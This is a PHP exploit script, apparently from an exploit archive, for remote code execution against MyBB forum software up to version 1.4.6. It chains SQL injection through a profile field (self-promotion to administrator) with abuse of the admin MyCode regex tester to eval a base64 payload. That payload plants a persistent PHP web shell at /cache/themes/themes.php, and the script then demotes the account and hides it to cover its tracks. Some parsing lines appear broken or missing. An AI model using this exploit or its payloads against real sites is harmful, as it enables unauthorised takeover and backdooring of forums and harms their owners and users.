MyBB <= 1.4.6 Remote Code Execution Exploit
===========================================


<?PHP
/*

Someone decided to contact mybb&#039;s staff informing about this vulnerability with the obvious result that this will not work anymore. 
Fucking moron.

I&#039;m releasing a non-finished version of the exploit. No help, PoC and with the necessity of --admindir flag.
Going to update it in the next days.
For historical reason, i&#039;m leaving the original title, but note that is <= 1.4.6


Example:

paradox@d3b14n:~/Files/Exploit-Pocs/My_Exploit/Remote/Mybb$ php myBBtomilw0rm.php -u anybody -p qwerty -t http://localhost/web/mybb/Upload/ --admindir /admin/
[.] Initialing.
[+] Logged in.
[+] my_post_key variable found.
[+] Turned On mybb&#039;s invisible mode.
[+] Sql code injected. You&#039;re now admin.
[+] Admindir found (or --admindir is used): /admin/.
[+] Admin sid Found: 824e26b4221673a0f213c37f87b9ccd7
[+] Site correctly backdoored.
[+] Sql code injected. You&#039;re now user.
[+] Backdoor URI: http://localhost/web/mybb/Upload//cache/themes/themes.php
All Done. The:Paradox hopes you used this exploit exclusively for your own fun and you enjoyed it.
Have a nice day :P


For the curious people: http://mybboard.it/forum/thread-3623.html

*/

/*

Mybb <= 1.4.4 Remote Code Execution through Sql Injection Exploit


Discovered: 	About 4 days before the exploit was coded.
Coded:		03-03-2009 
Author:		The:Paradox
Release:	Not yet. 

No php.ini setting can stop us ! =O 
A user (not email confirmed too) is needed.

Keep private or your keyboard will blew up.


*/


$mybb = new maibibi2;


class maibibi2 
{

	function __construct ()
	{



		$this->user	= $this->get_argv(&#039;-u&#039;);
		$this->pass	= $this->get_argv(&#039;-p&#039;);
		$this->target	= $this->get_argv(&#039;-t&#039;);
		$this->admindir	= $this->get_argv(&#039;--admindir&#039;);	
		$this->oa2u	= $this->get_argv(&#039;--onlyadmin2user&#039;);

		$this->ip	= &#039;67.167.124.135&#039;;
		$this->ua	= &#039;Mozilla 5.0&#039;;
		$this->bckdr	= &#039;/cache/themes/themes.php&#039;;

		if ($this->get_argv(&#039;--help&#039;) !== False || $this->get_argv(&#039;-h&#039;) !== False)	$this->help();
		if (!$this->user || !$this->pass)						die ("You have to insert User/Password\r\nUse --help or -h for more informations.\r\n");
		if (!$this->target)								die ("You have to insert Target\r\nUse --help or -h for more informations.\r\n");
			
		$this->http();
		$this->init();

			
	}

	function help ()
	{

		die ("Under Construction\r\n");

	}

	function get_argv ($what)
	{
		global $argv;

		if (!$n = array_search($what, $argv)) return False;
		return $argv[$n+1];	
	}

	function init ()
	{

		set_time_limit(0); // about 30 seconds left? Be serious.

		echo "[.] Initialing.\r\n";

			if (!$this->mybbuser = $this->ilovecookies ()) die ("Incorrect credentials.\r\n");

		echo "[+] Logged in.\r\n";

			if (!$this->mypostkey = $this->getmypostkey())  die ("My_Post_Key Not Found.\r\n");

		echo "[+] my_post_key variable found.\r\n";

			$this->hidemefromonlinelist();

		echo "[+] Turned On mybb&#039;s invisible mode.\r\n";

			$this->user2admin();

		echo "[+] Sql code injected. You&#039;re now admin.\r\n";

			if (!$this->admindir && !$this->admindir = $this->findadmindir()) die ("Unable to find admin Dir.\r\nWhatever it&#039;s possible your user is currently an administrator.\r\nIf you know admin dir path, you may use --admindir\r\n");

		echo "[+] Admindir found (or --admindir is used): {$this->admindir}.\r\n";		

			if (!$this->adminsid = $this->loginadmin())  die ("[-] Unable to login as admin.\r\nWhatever it&#039;s possible your user is currently an administrator.\r\n");
		
		echo "[+] Admin sid Found: {$this->adminsid}\r\n";		
			#$this->writabledirs();
			$this->rce ();		
			if (!$this->checkrce ()) die ("Unable to Execute PHP Code.\r\nWhatever it&#039;s possible your user is currently an administrator.\r\n");

		echo "[+] Site correctly backdoored.\r\n";

			$this->admin2user();

		echo "[+] Sql code injected. You&#039;re now user.\r\n";
		echo "[+] Backdoor URI: {$this->target}{$this->bckdr}\r\n";
		echo "All Done. The:Paradox hopes you used this exploit exclusively for your own fun and you enjoyed it.\r\nHave a nice day :P\r\n\r\n";

	}	

	function ilovecookies ()
	{
		$this->header = array (&#039;client-ip&#039; => $this->ip ,&#039;User-Agent&#039; => $this->ua);
		$this->postdata = array (&#039;username&#039; => $this->user, &#039;password&#039; => $this->pass, &#039;submit&#039; => &#039;Login&#039;, &#039;action&#039; => &#039;do_login&#039;);
		
		$rsp = $this->post ("{$this->target}/member.php");
		

		return $res[1][0];
		

	}

	function getmypostkey ()
	{

		$this->header = array (&#039;client-ip&#039; => $this->ip ,&#039;User-Agent&#039; => $this->ua, &#039;Referer&#039; => "{$this->target}/member.php", &#039;Cookie&#039; => "mybbuser={$this->mybbuser};");
		$rsp = $this->get ("{$this->target}/usercp.php?action=profile");


		return $res[1][0];				

	}

	function hidemefromonlinelist()

	{
		$this->header = array (&#039;client-ip&#039; => $this->ip ,&#039;User-Agent&#039; => $this->ua, &#039;Referer&#039; => "{$this->target}/usercp.php?action=profile", &#039;Cookie&#039; => "mybbuser={$this->mybbuser};");
		$this->postdata = array (&#039;my_post_key&#039; => $this->mypostkey, &#039;invisible&#039; => &#039;1&#039;, &#039;action&#039; => &#039;do_options&#039;, &#039;regsubmit&#039; => &#039;Update+Options&#039;);
		
		$rsp = $this->post ("{$this->target}/member.php");
		
	}

	function user2admin ()

	{

		$this->header = array (&#039;client-ip&#039; => $this->ip ,&#039;User-Agent&#039; => $this->ua, &#039;Referer&#039; => "{$this->target}/usercp.php?action=profile", &#039;Cookie&#039; => "mybbuser={$this->mybbuser};");
		$this->postdata = array (&#039;my_post_key&#039;			 => $this->mypostkey, 
					&#039;invisible&#039;			=> &#039;1&#039;, 
					&#039;bday1&#039;				=> &#039;&#039;, 
					&#039;bday2&#039;				=> &#039;&#039;, 
					&#039;bday3&#039;				=> &#039;&#039;, 
					&#039;website&#039;			=> &#039;http%3A%2F%2F&#039;, 
					&#039;profile_fields%5Bfid3%5D&#039;	=> &#039;Undisclosed&#039;, 
					&#039;profile_fields%5Bfid2%5D&#039;	=> &#039;Undisclosed&#039;,
					&#039;profile_fields%5Bfid1%5D&#039;	=> &#039;Undisclosed&#039;, 
					&#039;usertitle&#039;			=> &#039;&#039;,
					&#039;icq&#039;				=> &#039;&#039;, 
					&#039;aim&#039;				=> &#039;&#039;, 
					&#039;msn&#039;				=> &#039;&#039;, 
					&#039;yahoo&#039;				=> &#039;&#039;, 
					&#039;away&#039;				=> &#039;0&#039;, 
					&#039;awayreason&#039;			=> &#039;&#039;, 
					&#039;awayday&#039;			=> &#039;&#039;, 
					&#039;awaymonth&#039;			=> &#039;&#039;,
					&#039;awayyear&#039;			=> &#039;&#039;,
					&#039;birthdayprivacy&#039;		=> "all&#039;, usergroup=4, email=&#039;pr3sident@whit3house.gov&#039;,regip=&#039;79.140.81.83&#039;, longregip=&#039;1334595923&#039;, lastip=&#039;&#039;, longlastip=&#039;",
					&#039;action&#039;			=> &#039;do_profile&#039;, 
					&#039;regsubmit&#039;			=> &#039;1&#039;);

		$rsp = $this->post ("{$this->target}/usercp.php");

	}
	
	function findadmindir ()
	{

		$this->header = array (&#039;client-ip&#039; => $this->ip ,&#039;User-Agent&#039; => $this->ua, &#039;Referer&#039; => "{$this->target}/usercp.php?action=profile", &#039;Cookie&#039; => "mybbuser={$this->mybbuser};");
		$rsp = $this->get("{$this->target}/index.php");


 &mdash; <a href=\"{$this->target}(.+?)/index.php\">~",$rsp,$res)) return False;

		return $res[1][0];				



	}

	function loginadmin ()

	{
		
		$this->header = array (&#039;client-ip&#039; => $this->ip ,&#039;User-Agent&#039; => $this->ua, &#039;Referer&#039; => "{$this->target}/usercp.php?action=profile", &#039;Cookie&#039; => "mybbuser={$this->mybbuser};");
		$this->postdata = array (&#039;username&#039; => $this->user, &#039;password&#039; => $this->pass, &#039;do&#039; => &#039;login&#039;);

		$rsp = $this->post ("{$this->target}/{$this->admindir}/index.php");
		

		return $res[1][0];
	}

	function writabledirs ()
	{
		$this->header = array (&#039;client-ip&#039; => $this->ip ,&#039;User-Agent&#039; => $this->ua, &#039;Referer&#039; => "{$this->target}/{$this->admindir}/index.php?", &#039;Cookie&#039; => "mybbuser={$this->mybbuser}; adminsid={$this->adminsid};");
		$this->get ("{$this->target}/{$this->admindir}/index.php?module=tools") ;


	}


	function rceOld ()

	{

	//edits inc/functions.php (original one)

	$this->header = array (&#039;client-ip&#039; => $this->ip ,&#039;User-Agent&#039; => $this->ua, &#039;X-Requested-With&#039; => &#039;XMLHttpRequest&#039;, &#039;Referer&#039; => "{$this->target}/{$this->admindir}/index.php?module=config/mycode&action=edit&cid=1", &#039;Cookie&#039; => "mybbuser={$this->mybbuser}; adminsid={$this->adminsid};");
	$this->postdata = array (&#039;my_post_key&#039;			 => $this->mypostkey, 
					&#039;o_o&#039;				=> &#039;phpinfo();&#039;, 
					&#039;regex&#039;				=> &#039;(.*%3F)#e%00&#039;, 
					&#039;replacement&#039;			=> &#039;die(eval(stripslashes($_REQUEST[\&#039;o_o\&#039;])));&#039;, 
					&#039;test_value&#039;			=> &#039;XoD&#039;);

	$rsp = $this->post ("{$this->target}/{$this->admindir}/index.php?module=config/mycode&action=xmlhttp_test_mycode");


	}

	function rce ()

	{

	$this->header = array (&#039;client-ip&#039; => $this->ip ,&#039;User-Agent&#039; => $this->ua, &#039;X-Requested-With&#039; => &#039;XMLHttpRequest&#039;, &#039;Referer&#039; => "{$this->target}/{$this->admindir}/index.php?module=config/mycode&action=edit&cid=1", &#039;Cookie&#039; => "mybbuser={$this->mybbuser}; adminsid={$this->adminsid};");
	$this->postdata = array (&#039;my_post_key&#039;			 => $this->mypostkey, 
					&#039;o_o&#039;				=> &#039;JGZwID0gZm9wZW4oJF9SRVFVRVNUWydmaWxlJ10sICdhJyk7DQpmd3JpdGUoJGZwLCAnPD9QSFAgaWYgKGlzc2V0KCRfUkVRVUVTVFt4XSkpIGV2YWwoc3RyaXBzbGFzaGVzKCRfUkVRVUVTVFt4XSkpOyA/PicpOw0KZmNsb3NlKCRmcCk7&#039;, 
					&#039;regex&#039;				=> &#039;(.*%3F)#e%00&#039;, 
					&#039;replacement&#039;			=> &#039;die(eval(base64_decode($_REQUEST[\&#039;o_o\&#039;])));&#039;, 
					&#039;test_value&#039;			=> &#039;XoD&#039;,
					&#039;file&#039;				=> "../{$this->bckdr}");

	$rsp = $this->post ("{$this->target}/{$this->admindir}/index.php?module=config/mycode&action=xmlhttp_test_mycode");


	}


	function admin2user ()
	
	{

		$this->header = array (&#039;client-ip&#039; => $this->ip ,&#039;User-Agent&#039; => $this->ua, &#039;Referer&#039; => "{$this->target}/usercp.php?action=profile", &#039;Cookie&#039; => "mybbuser={$this->mybbuser};");
		$this->postdata = array (&#039;my_post_key&#039;			 => $this->mypostkey, 
					&#039;invisible&#039;			=> &#039;1&#039;, 
					&#039;bday1&#039;				=> &#039;&#039;, 
					&#039;bday2&#039;				=> &#039;&#039;, 
					&#039;bday3&#039;				=> &#039;&#039;, 
					&#039;website&#039;			=> &#039;http%3A%2F%2F&#039;, 
					&#039;profile_fields%5Bfid3%5D&#039;	=> &#039;Undisclosed&#039;, 
					&#039;profile_fields%5Bfid2%5D&#039;	=> &#039;Undisclosed&#039;,
					&#039;profile_fields%5Bfid1%5D&#039;	=> &#039;Undisclosed&#039;, 
					&#039;usertitle&#039;			=> &#039;&#039;,
					&#039;icq&#039;				=> &#039;&#039;, 
					&#039;aim&#039;				=> &#039;&#039;, 
					&#039;msn&#039;				=> &#039;&#039;, 
					&#039;yahoo&#039;				=> &#039;&#039;, 
					&#039;away&#039;				=> &#039;0&#039;, 
					&#039;awayreason&#039;			=> &#039;&#039;, 
					&#039;awayday&#039;			=> &#039;&#039;, 
					&#039;awaymonth&#039;			=> &#039;&#039;,
					&#039;awayyear&#039;			=> &#039;&#039;,
					&#039;birthdayprivacy&#039;		=> "all&#039;, usergroup=2, email=&#039;pr3sident.whit3house@gmail.com&#039;,regip=&#039;79.140.81.83&#039;, longregip=&#039;1334595923&#039;, lastip=&#039;&#039;, longlastip=&#039;",
					&#039;action&#039;			=> &#039;do_profile&#039;, 
					&#039;regsubmit&#039;			=> &#039;1&#039;);

		$rsp = $this->post ("{$this->target}/usercp.php");

	}

	function checkrce_old ()

	{
		$this->header = array (&#039;client-ip&#039; => $this->ip ,&#039;Cookie&#039; => &#039;x=print \&#039;.:31337:.\&#039;%3B;&#039;);
		$rsp = $this->get ("{$this->target}/{$this->admindir}/inc/functions.php?");

		if (!strstr($rsp,&#039;.:31337:.&#039;))	return False;
		else				return True;

	}

	function checkrce ()

	{
		$this->header = array (&#039;client-ip&#039; => $this->ip ,&#039;Cookie&#039; => &#039;x=print \&#039;.:31337:.\&#039;%3B;&#039;);
		$rsp = $this->get ("{$this->target}/{$this->bckdr}");

		if (!strstr($rsp,&#039;.:31337:.&#039;))	return False;
		else				return True;

	}


	function http ($port = 80, $header = array(), $post = array(), $timeout = 30)
	{

		$this->port	= $port;
		$this->timeout	= $timeout;
		$this->header	= $header;
		$this->postdata	= $post;
	}

	function get ($url)
	{
		$this->url = parse_url($url);
		$this->packet = array();

		$this->packet[] = "GET {$this->url[&#039;path&#039;]}?{$this->url[&#039;query&#039;]}{$this->url[&#039;fragment&#039;]} HTTP/1.1";
		$this->packet[] = "Host: {$this->url[&#039;host&#039;]}";

		foreach ($this->header as $header => $value)
		{
			$this->packet[] = "$header: $value";
		}
		
		$this->packet[] = "\r\n\r\n"; 
		$this->packet	= implode ("\r\n",$this->packet);

		return $this->conn();
	}

	function post ($url)
	{
		$this->url = parse_url($url);

		$this->packet = array();
		$this->postcontent = &#039;&#039;;

		$this->packet[] = "POST {$this->url[&#039;path&#039;]}?{$this->url[&#039;query&#039;]}{$this->url[&#039;fragment&#039;]} HTTP/1.1";
		$this->packet[] = "Host: {$this->url[&#039;host&#039;]}";

		foreach ($this->header as $header => $value)
		{
			$this->packet[] = "$header: $value";
		}
	
		foreach ($this->postdata as $post => $value)
		{
			if ($this->postcontent != &#039;&#039;) $this->postcontent .= &#039;&&#039;; 
			$this->postcontent .= "$post=$value";
		}
	
		$this->packet[] = &#039;Content-Type: application/x-www-form-urlencoded&#039;;
		$this->packet[] = "Content-Length: ".strlen($this->postcontent)."\r\n";
		$this->packet[] = $this->postcontent;

		$this->packet	= implode ("\r\n",$this->packet);

		return $this->conn();
	}


	function conn()
	{
		if (!isset($this->url[&#039;port&#039;]))	$this->url[&#039;port&#039;] = $this->port;

		$sk = fsockopen ($this->url[&#039;host&#039;], $this->url[&#039;port&#039;], $eno, $estr, $this->timeout);

		if (!is_resource($sk))	return "[-] Fsockopen Failed! Error: ".$estr." [".$eno."]" ;

		else	{

    				fputs($sk, $this->packet);
				$rsp = "";
				
				while (!feof($sk)) 
					{
	       					$rsp .= fgets ($sk, 1024);
					}
			}

		fclose($sk);
		return $rsp;
	}



}




?>




